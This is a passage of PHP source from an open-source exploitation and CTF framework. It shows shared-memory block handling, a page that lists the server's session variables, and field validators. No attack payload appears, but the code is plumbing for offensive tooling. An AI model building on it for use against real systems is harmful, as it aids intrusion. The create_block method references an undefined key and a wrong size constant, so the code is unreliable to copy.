                            $_item_size = Class_Base_Format::hex_to_dec ( substr ( $_item , Interface_Base_Block_Keys::SIZE_BLOCK_KEY , Interface_Base_Block_Keys::SIZE_BLOCK_SIZE ) );
                            if ( ( ! Class_Base_Format::is_empty ( $_item_key ) ) && ( ! Class_Base_Format::is_empty ( $_item_size ) ) && ( $_item_key != $_key ) ) {
                                $_item_shmid = self::open_share_memory ( $_item_key , self::MODE_SHARE_MEMORY_READ_AND_WRITE , $_item_size , self::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
                                if ( ! empty( $_item_shmid ) ) {
                                    self::clear_share_memory ( $_item_shmid );
                                }
                            }
                        } catch ( \Exception $e ) {
                            Class_Base_Response::outputln ( $e );
                        }
                    }
                }
                self::clear_share_memory ( $_shmid );
            }
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:29
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Block extends Class_Base implements Interface_Base_Block
{
    private $_head     = null;
    private $_content  = null;
    private $_end_flag = null;

    public static function exist_block ( $key , $size )
    {
        $_block_size = ( self::SIZE_BLOCK_HEAD + $size + self::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( ! empty( $_block_id ) ) {
            $_head = Class_Base_Memory::read_share_memory ( $_block_id , self::OFFSET_START , self::SIZE_BLOCK_HEAD , Class_Base_Format::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            if ( ! Class_Base_Format::is_empty ( $_head ) ) {
                $_head_block_key = substr ( $_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY );
                if ( ! Class_Base_Format::is_empty ( $_head_block_key ) ) {
                    $_head_content_size = substr ( $_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE );
                    if ( ! Class_Base_Format::is_empty ( $_head_content_size ) ) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static function open_block ( $key , $size )
    {
        if ( ! is_integer ( $size ) ) {
            throw new \Exception( "size is not a integer" , 0 );
        }
        $_block_size = ( self::SIZE_BLOCK_HEAD + $size + self::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( empty( $_block_id ) ) {
            throw new \Exception( "share memory id is empty" , 0 );
        }
        $_head     = Class_Base_Memory::read_share_memory ( $_block_id , self::OFFSET_START , self::SIZE_BLOCK_HEAD , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        $_content  = Class_Base_Memory::read_share_memory ( $_block_id , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD ) , $size , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        $_end_flag = Class_Base_Memory::read_share_memory ( $_block_id , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD + $size ) , self::SIZE_BLOCK_END_FLAG , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        $_block    = new Class_Base_Block( $_head , $_content , $_end_flag );
        return $_block;
    }

    public static function create_block ( $head_block_name , $head_block_key , $head_content_size , $head_block_status , $head_block_mode , $head_block_type , $head_content_type , $head_reserved , $head_end_flag , $content , $end_flag )
    {
        if ( $head_content_type == Interface_Base_FormatType::TYPE_FORMAT_INTEGER ) {
            $head_content_size = self::SIZE_BLOCK_HEAD_CONTENT_SIZE;
        }
        $_head_block_name   = Class_Base_Format::format_name_write ( $head_block_name , self::SIZE_BLOCK_HEAD_BLOCK_NAME );
        $_head_block_key    = Class_Base_Format::format_key_write ( $head_block_key );
        $_head_content_size = Class_Base_Format::format_size_write ( $head_content_size );
        $_head_block_status = Class_Base_Format::format_status_write ( $head_block_status );
        $_head_block_mode   = Class_Base_Format::format_mode_write ( $head_block_mode );
        $_head_block_type   = Class_Base_Format::format_type_write ( $head_block_type );
        $_head_content_type = Class_Base_Format::format_type_write ( $head_content_type );
        $_head_reserved     = Class_Base_Format::format_reserved_write ( $head_reserved , self::SIZE_BLOCK_HEAD_RESERVED );
        $_head_end_flag     = Class_Base_Format::format_end_flag_write ( $head_end_flag , self::SIZE_BLOCK_HEAD_END_FLAG );
        $_head              = ( $_head_block_name . $_head_block_key . $_head_content_size . $_head_block_status . $_head_block_mode . $_head_block_type . $_head_content_type . $_head_reserved . $_head_end_flag );
        $_content           = Class_Base_Format::format_content_write ( $content , $head_content_size , $head_content_type );
        $_end_flag          = Class_Base_Format::format_end_flag_write ( $end_flag , self::SIZE_BLOCK_END_FLAG );
        $_data              = ( $_head . $_content . $_end_flag );
        $_block_size        = ( self::SIZE_BLOCK_HEAD_CONTENT_SIZE + $head_content_size + self::SIZE_BLOCK_END_FLAG );
        $_data_length       = strlen ( $_data );
        if ( $_block_size != $_data_length ) {
            throw new \Exception( "block size is error , block size ( " . $_block_size . " ) , data length ( " . $_data_length . " ) " , 0 );
        }
        self::check_block ( $_head , $_content , $head_content_type , $_end_flag );
        $_block_id = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( ! empty( $_block_id ) ) {
            $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_data , self::OFFSET_START , Interface_Base_FormatType::TYPE_FORMAT_STRING );
            if ( ( ! empty( $_write_length ) ) && ( $_write_length == $_data_length ) ) {
                $_block = new Class_Base_Block( $_head , $_content , $_end_flag );
                return $_block;
            }
        }
        return null;
    }

    public static function clear_block_by_content_size ( $key , $content_size )
    {
        $_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $content_size + Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( ! empty( $_block_id ) ) {
            $_block_type = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () );
            if ( ( $_block_type == Interface_Base_BlockType::TYPE_BLOCK_DATA ) || ( $_block_type == Interface_Base_BlockType::TYPE_BLOCK_INDEXES ) || ( $_block_type == Interface_Base_BlockType::TYPE_BLOCK_UNIQUE_INDEX ) || ( $_block_type == Interface_Base_BlockType::TYPE_BLOCK_SOCKETS ) ) {
                $_bool = Class_Base_Memory::clear_share_memory_by_key ( $key , $_block_size );
                return $_bool;
            }
        }
        return false;
    }

    public static function clear_block_by_block_size ( $key , $block_size )
    {
        $_block_id = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $block_size );
        if ( ! empty( $_block_id ) ) {
            $_block_type = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () );
            $_block_type = Class_Base_Format::format_type_read ( $_block_type );
            if ( $_block_type == Interface_Base_BlockKey::INDEXES ) {
                $_indexes_item_count = Class_Base_Block_Indexes::get_map_count_for_clear ( $key );
                if ( ! empty( $_indexes_item_count ) ) {
                    return false;
                }
            }
            $_bool = Class_Base_Memory::clear_share_memory_by_key ( $key , $block_size );
            return $_bool;

        }
        return false;
    }

    public static function check_block ( $head , $content , $head_content_type , $end_flag )
    {
        if ( ( ! is_string ( $head ) ) || ( strlen ( $head ) != self::SIZE_BLOCK_HEAD ) ) {
            throw new \Exception( ( "head is not a string or head length is not " . self::SIZE_BLOCK_HEAD ) , 0 );
        }
        if ( strlen ( strval ( $content ) ) <= 0 ) {
            throw new \Exception( "content length is less than or equal to 0" , 0 );
        }
        if ( ! Class_Base_Format::is_minlen_to_maxlen_hex ( substr ( $head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) , Class_Base_Format::HEX_MAX_LENGTH , Class_Base_Format::HEX_MAX_LENGTH ) ) {
            throw new \Exception( "content size is not a vaild hex number" , 0 );
        }
        if ( ! Class_Base_Format::is_minlen_to_maxlen_integer ( Class_Base_Format::hex_to_dec ( substr ( $head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) ) , Class_Base_Format::INTEGER_MIN_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) {
            throw new \Exception( "content size is not a vaild integer number" , 0 );
        }
        if ( $head_content_type == Interface_Base_FormatType::TYPE_FORMAT_INTEGER ) {
            if ( Class_Base_Format::hex_to_dec ( substr ( $head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) ) != self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) {
                throw new \Exception( "content size is error" , 0 );
            }
            if ( ! Class_Base_Format::is_minlen_to_maxlen_hex ( $content , Class_Base_Format::HEX_MAX_LENGTH , Class_Base_Format::HEX_MAX_LENGTH ) ) {
                throw new \Exception( "content is not a valid hex number" , 0 );
            }
            if ( ! Class_Base_Format::is_minlen_to_maxlen_integer ( Class_Base_Format::hex_to_dec ( $content ) , Class_Base_Format::INTEGER_MIN_LENGTH , Class_Base_Format::INTEGER_MAX_LENGTH ) ) {
                throw new \Exception( "content is not a valid integer number" , 0 );
            }
        } else {
            if ( Class_Base_Format::hex_to_dec ( substr ( $head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) != strlen ( $content ) ) ) {
                throw new \Exception( "content size is error" , 0 );
            }
        }
        if ( ( ! is_string ( $end_flag ) ) || ( strlen ( $end_flag ) != self::SIZE_BLOCK_END_FLAG ) ) {
            throw new \Exception( "end_flag is error" , 0 );
        }
        if ( strlen ( $head . $content . $end_flag ) != ( self::SIZE_BLOCK_HEAD + ( Class_Base_Format::hex_to_dec ( substr ( $head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) ) ) + self::SIZE_BLOCK_END_FLAG ) ) {
            throw new \Exception( "share memory data length is error" , 0 );
        }
    }

    public function __construct ( $head , $content , $end_flag )
    {
        $this->_head     = $head;
        $this->_content  = $content;
        $this->_end_flag = $end_flag;
    }

    public function __destruct ()
    {
        $this->_head     = null;
        $this->_content  = null;
        $this->_end_flag = null;
    }

    public function get_head_block_name ()
    {
        $_block_name = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_block_name = substr ( $this->_head , ( self::OFFSET_START ) , self::SIZE_BLOCK_HEAD_BLOCK_NAME );
            $_block_name = Class_Base_Format::format_name_read ( $_block_name );
        }
        return $_block_name;
    }

    public function get_head_block_key ()
    {
        $_block_key = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_block_key = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY );
            $_block_key = Class_Base_Format::format_key_read ( $_block_key );
        }
        return $_block_key;
    }

    public function get_head_content_size ()
    {
        $_content_size = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_content_size = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE );
            $_content_size = Class_Base_Format::format_size_read ( $_content_size );
        }
        return $_content_size;
    }

    public function get_head_block_status ()
    {
        $_block_status = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_block_status = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) , self::SIZE_BLOCK_HEAD_BLOCK_STATUS );
            $_block_status = Class_Base_Format::format_status_read ( $_block_status );
        }
        return $_block_status;
    }

    public function get_head_block_mode ()
    {
        $_block_mode = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_block_mode = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS ) , self::SIZE_BLOCK_HEAD_BLOCK_MODE );
            $_block_mode = Class_Base_Format::format_mode_read ( $_block_mode );
        }
        return $_block_mode;
    }

    public function get_head_block_type ()
    {
        $_block_type = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_block_type = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE ) , self::SIZE_BLOCK_HEAD_BLOCK_TYPE );
            $_block_type = Class_Base_Format::format_type_read ( $_block_type );
        }
        return $_block_type;
    }

    public function get_head_content_type ()
    {
        $_content_type = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_content_type = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE + self::SIZE_BLOCK_HEAD_BLOCK_TYPE ) , self::SIZE_BLOCK_HEAD_CONTENT_TYPE );
            $_content_type = Class_Base_Format::format_type_read ( $_content_type );
        }
        return $_content_type;
    }

    public function get_head_reserved ()
    {
        $_reserved = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_reserved = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE + self::SIZE_BLOCK_HEAD_BLOCK_TYPE + self::SIZE_BLOCK_HEAD_CONTENT_TYPE ) , self::SIZE_BLOCK_HEAD_RESERVED );
            $_reserved = Class_Base_Format::format_reserved_read ( $_reserved );
        }
        return $_reserved;
    }

    public function get_head_end_flag ()
    {
        $_end_flag = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_head ) ) && ( is_string ( $this->_head ) ) && ( strlen ( $this->_head ) == self::SIZE_BLOCK_HEAD ) ) {
            $_end_flag = substr ( $this->_head , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE + self::SIZE_BLOCK_HEAD_BLOCK_TYPE + self::SIZE_BLOCK_HEAD_CONTENT_TYPE + self::SIZE_BLOCK_HEAD_RESERVED ) , self::SIZE_BLOCK_HEAD_END_FLAG );
            $_end_flag = Class_Base_Format::format_end_flag_read ( $_end_flag );
        }
        return $_end_flag;
    }

    public function get_block_end_flag ()
    {
        $_end_flag = null;
        if ( ( ! Class_Base_Format::is_empty ( $this->_end_flag ) ) && ( is_string ( $this->_end_flag ) ) && ( strlen ( $this->_end_flag ) == self::SIZE_BLOCK_END_FLAG ) ) {
            $_end_flag = substr ( $this->_end_flag , ( self::OFFSET_START ) , self::SIZE_BLOCK_END_FLAG );
            $_end_flag = Class_Base_Format::format_end_flag_read ( $_end_flag );
        }
        return $_end_flag;
    }

    public function get_head ()
    {
        return $this->_head;
    }

    public function get_content ()
    {
        return $this->_content;
    }

    public function get_end_flag ()
    {
        return $this->_end_flag;
    }

    public function get_block_string ()
    {
        return ( $this->_head . $this->_content . $this->_end_flag );
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-6-6
 * Time: 下午2:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Document extends Class_Base implements Interface_Base_Document
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-27
 * Time: 下午6:55
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Session extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top::top ();
            $_body   = array (
                "menu"    => Class_View_Session_Menu::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom::bottom ();
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function session_info ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth::check_permission ();
        if ( is_cli () ) {
            Class_Base_Response::outputln (
                $_SESSION
            );
        }
        if ( ! is_cli () ) {
            $_cli_url           = Class_Base_Response::get_cli_url ( "/session/session_info" , array () );
            $_cli_encode_url = Class_Base_Response::get_urlencode ( $_cli_url );
            $_form_top          = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Display relevant information about PHP session environment variables</div>';
            $_form_top          .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface mainly displays the internal session variable content of the PHP language located on the server side.If you try to access this interface in a command-line environment, you may not be able to obtain valid information. Because in general, processes in the command line environment cannot obtain session environment information in the web environment (although we can achieve session environment information exchange between the web environment and the command line environment through special technical means. However, in order to reduce the software\'s inherent environmental dependencies and improve the software\'s compatibility and availability, the author of this software did not choose to do so).</div>';
            $_form              = array (
                "action" => "/session/session_info" ,
                "inputs" => array () ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit" => array (
                    "display" => false ,
                ) ,
                "reset"  => array (
                    "display" => false ,
                ) ,
            );
            foreach ( $_SESSION as $key => $value ) {
                $_form[ "inputs" ][] = array (
                    "id"       => $key ,
                    "title"    => ( ( strlen ( $key ) > 12 ) ? ( substr ( $key , 0 , 12 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) : ( $key ) ) ,
                    "describe" => $key ,
                    "name"     => $key ,
                    "value"    => ( $value ) ,
                    "disabled" => "disabled" ,
                );
            }
            $_top         = Class_View_Top::top ();
            $_body        = array (
                "menu"    => Class_View_Session_Menu::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom      = Class_View_Bottom::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午4:59
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Block_IndexesItem extends Class_Base implements Interface_Base_Block_IndexesItem
{
    private $_block_name;
    private $_block_key;
    private $_content_size;
    private $_block_status;
    private $_block_mode;
    private $_block_type;
    private $_content_type;
    private $_reserved;
    private $_item_end_flag;

    public static function is_block_indexes_item ( $block )
    {
        if ( ( empty( $block ) ) || ( ! is_object ( $block ) ) || ( ! ( $block instanceof Class_Base_Block_IndexesItem ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_block_name ( $block )
    {
        if ( ! property_exists ( $block , "_block_name" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_name ) ) || ( ! is_string ( $block->_block_name ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_block_key ( $block )
    {
        if ( ! property_exists ( $block , "_block_key" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_key ) ) || ( ! is_integer ( $block->_block_key ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_size ( $block )
    {
        if ( ! property_exists ( $block , "_content_size" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_content_size ) ) || ( ! is_integer ( $block->_content_size ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_status ( $block )
    {
        if ( ! property_exists ( $block , "_block_status" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_status ) ) || ( ! is_integer ( $block->_block_status ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_mode ( $block )
    {
        if ( ! property_exists ( $block , "_block_mode" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_mode ) ) || ( ! is_integer ( $block->_block_mode ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_block_type ( $block )
    {
        if ( ! property_exists ( $block , "_block_type" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_type ) ) || ( ! is_integer ( $block->_block_type ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_content_type ( $block )
    {
        if ( ! property_exists ( $block , "_content_type" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_content_type ) ) || ( ! is_integer ( $block->_content_type ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_indexes_item_reserved ( $block )
    {
        if ( ! property_exists ( $block , "_reserved" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_reserved ) ) || ( ! is_string ( $block->_reserved ) ) ) {
            return false;
        }
        if ( strlen ( $block->_reserved ) != self::SIZE_BLOCK_INDEXES_ITEM_RESERVED ) {
            return false;
        }
        return true;
    }

    public static function check_block_item_end_flag ( $block )
    {
        if ( ! property_exists ( $block , "_item_end_flag" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_item_end_flag ) ) || ( ! is_string ( $block->_item_end_flag ) ) ) {
            return false;
        }
        return true;
    }

    public static function create_block_indexes_item ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $indexes_item_end_flag )
    {
        $_block_data = new Class_Base_Block_IndexesItem( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $indexes_item_end_flag );
        return $_block_data;
    }

    public static function get_indexes_item_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START );
        return $_offset;
    }

    public static function get_indexes_item_block_name_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START );
        return $_offset;
    }

    public static function get_indexes_item_block_key_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
        return $_offset;
    }

    public static function get_indexes_item_content_size_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
        return $_offset;
    }

    public static function get_indexes_item_block_status_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE );
        return $_offset;
    }

    public static function get_indexes_item_block_mode_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS );
        return $_offset;
    }

    public static function get_indexes_item_block_type_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE );
        return $_offset;
    }

    public static function get_indexes_item_content_type_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE );
        return $_offset;
    }

    public static function get_indexes_item_reserved_offset ()
    {
